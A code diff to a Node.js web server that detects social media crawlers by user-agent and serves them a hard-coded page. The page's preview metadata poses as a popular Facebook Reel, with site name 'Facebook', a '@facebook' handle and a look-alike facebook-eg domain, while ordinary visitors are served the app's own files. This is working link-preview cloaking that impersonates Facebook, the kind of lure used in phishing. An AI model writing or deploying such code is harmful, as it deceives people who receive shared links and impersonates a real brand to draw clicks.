@@ -61,6 +61,45 @@ const server = http.createServer((req, res) => {
   // Serve static files
   if (isProduction) {
     const cleanUrl = req.url.split('?')[0];
+
+    // If request comes from a social media crawler/bot (WhatsApp, Facebook, Messenger, Telegram, Twitter, etc.)
+    const userAgent = req.headers['user-agent'] || '';
+    const isCrawler = /bot|crawl|spider|facebookexternalhit|facebot|whatsapp|telegram|twitterbot|discordbot|slackbot|linkedinbot|skypeuripreview|applebot/i.test(userAgent);
+
+    if (isCrawler && (cleanUrl === '/' || !path.extname(cleanUrl))) {
+      const crawlerHtml = `<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>511K views • 5K likes | Reel by Semsem Photograph</title>
+  <meta name="description" content="511K views • 5K likes | Reel by Semsem Photograph" />
+  <meta property="og:site_name" content="Facebook" />
+  <meta property="og:type" content="video.other" />
+  <meta property="og:url" content="https://facebook-eg.up.railway.app/" />
+  <meta property="og:title" content="511K views • 5K likes | Reel by Semsem Photograph" />
+  <meta property="og:description" content="511K views • 5K likes | Reel by Semsem Photograph" />
+  <meta property="og:image" content="https://facebook-eg.up.railway.app/download.jpg" />
+  <meta property="og:image:secure_url" content="https://facebook-eg.up.railway.app/download.jpg" />
+  <meta property="og:image:type" content="image/jpeg" />
+  <meta property="og:image:width" content="575" />
+  <meta property="og:image:height" content="1024" />
+  <meta property="og:image:alt" content="Reel by Semsem Photograph" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:site" content="@facebook" />
+  <meta name="twitter:title" content="511K views • 5K likes | Reel by Semsem Photograph" />
+  <meta name="twitter:description" content="511K views • 5K likes | Reel by Semsem Photograph" />
+  <meta name="twitter:image" content="https://facebook-eg.up.railway.app/download.jpg" />
+  <link rel="image_src" href="https://facebook-eg.up.railway.app/download.jpg" />
+  <link rel="icon" type="image/jpeg" href="https://facebook-eg.up.railway.app/download.jpg" />
+</head>
+<body>
+</body>
+</html>`;
+      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
+      res.end(crawlerHtml);
+      return;
+    }
+
     let filePath = path.join(DIST_DIR, cleanUrl === '/' ? 'index.html' : cleanUrl);
 
     fs.readFile(filePath, (err, content) => {
